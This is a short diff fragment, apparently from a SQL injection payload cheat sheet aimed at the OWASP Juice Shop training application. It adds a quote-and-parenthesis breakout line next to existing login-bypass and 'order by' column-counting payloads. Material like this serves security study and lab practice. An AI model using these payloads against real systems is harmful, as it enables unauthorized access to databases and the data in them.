@@ -85,6 +85,8 @@ admin") or "1"="1"/*
 ```
 # SQL Inject Extract Schema Database Juice-Shop
 
+')
+
 ')) --
 
 ')) order by 9 -- 
